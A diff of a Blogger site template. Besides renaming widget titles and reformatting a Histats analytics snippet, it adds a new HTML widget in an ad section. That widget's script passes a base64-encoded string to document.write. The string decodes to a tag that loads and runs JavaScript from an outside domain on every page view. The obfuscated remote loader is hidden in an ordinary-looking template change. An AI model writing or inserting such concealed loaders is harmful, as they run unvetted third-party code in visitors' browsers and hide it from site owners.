@@ -605,7 +605,7 @@ color: rgba(255,255,255,1);
 <div class='full-row clearfloat' id='header-area'>
 <div id='menu-icon'><svg id='icon-home' viewBox='0 0 24 24'><path d='M1 17h22v2h-22v-2zm0-12v2h22v-2h-22zm0 8h22v-2h-22v2z'/></svg></div>
 <b:section id='header-wrapper' maxwidgets='1' showaddelement='no'>
-  <b:widget id='Header1' locked='true' title='Kasiyahan sa Pagtitipon (Header)' type='Header' version='1'>
+  <b:widget id='Header1' locked='true' title='pamilyasa (Header)' type='Header' version='1'>
     <b:widget-settings>
       <b:widget-setting name='displayUrl'/>
       <b:widget-setting name='displayHeight'>0</b:widget-setting>
@@ -732,7 +732,7 @@ color: rgba(255,255,255,1);
 <b:if cond='data:blog.pageType == &quot;item&quot;'>
 </b:if>
         <b:section class='main' id='main' showaddelement='no'>
-          <b:widget id='Blog1' locked='true' title='Mga Post sa Blog' type='Blog' version='1'>
+          <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog' version='1'>
             <b:widget-settings>
               <b:widget-setting name='showDateHeader'>true</b:widget-setting>
               <b:widget-setting name='commentLabel'>Comments</b:widget-setting>
@@ -1741,18 +1741,18 @@ if (hash.length &gt; 8) {
   </b:widget>
   <b:widget id='HTML4' locked='false' title='' type='HTML'>
     <b:widget-settings>
-      <b:widget-setting name='content'>&lt;!-- Histats.com  START  (aync)--&gt;
-&lt;script type=&quot;text/javascript&quot;&gt;var _Hasync= _Hasync|| [];
-_Hasync.push([&#39;Histats.start&#39;, &#39;1,4720533,4,0,0,0,00010000&#39;]);
-_Hasync.push([&#39;Histats.fasi&#39;, &#39;1&#39;]);
-_Hasync.push([&#39;Histats.track_hits&#39;, &#39;&#39;]);
+      <b:widget-setting name='content'><![CDATA[<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4720533,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
 (function() {
-var hs = document.createElement(&#39;script&#39;); hs.type = &#39;text/javascript&#39;; hs.async = true;
-hs.src = (&#39;//s10.histats.com/js15_as.js&#39;);
-(document.getElementsByTagName(&#39;head&#39;)[0] || document.getElementsByTagName(&#39;body&#39;)[0]).appendChild(hs);
-})();&lt;/script&gt;
-&lt;noscript&gt;&lt;a href=&quot;/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;//sstatic1.histats.com/0.gif?4720533&amp;amp;101&quot; alt=&quot;&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/noscript&gt;
-&lt;!-- Histats.com  END  --&gt;</b:widget-setting>
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4720533&amp;101" alt="" border="0" /></a></noscript>
+<!-- Histats.com  END  -->]]></b:widget-setting>
     </b:widget-settings>
     <b:includable id='main'>
   <!-- only display title if it's non-empty -->
@@ -1774,7 +1774,24 @@ hs.src = (&#39;//s10.histats.com/js15_as.js&#39;);
 </div> <!-- end content-wrapper -->
 <!-- iklan -->
       <div id='iklan-bawah'><b:if cond='data:blog.searchQuery or data:blog.pageType == &quot;static_page&quot;'><b:else/>
-        <b:section class='iklan-bawah section' id='iklan-bawah-1' maxwidgets='1' showaddelement='yes'/>
+        <b:section class='iklan-bawah section' id='iklan-bawah-1' maxwidgets='1' showaddelement='yes'>
+          <b:widget id='HTML3' locked='false' title='' type='HTML'>
+            <b:widget-settings>
+              <b:widget-setting name='content'><![CDATA[<script>document.write(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8vcGFnc3VsYXQuY29tL2lrbGFuL2xpbWFwdWx1aHRpZ2FkdWFwdWx1aC5qcyI+IDwvc2NyaXB0Pg=="));</script>]]></b:widget-setting>
+            </b:widget-settings>
+            <b:includable id='main'>
+  <!-- only display title if it's non-empty -->
+  <b:if cond='data:title != &quot;&quot;'>
+    <h2 class='title'><data:title/></h2>
+  </b:if>
+  <div class='widget-content'>
+    <data:content/>
+  </div>
+
+  <b:include name='quickedit'/>
+</b:includable>
+          </b:widget>
+        </b:section>
         </b:if></div>
 </div><!-- end outer-wrapper -->
 <div class='clear'/>
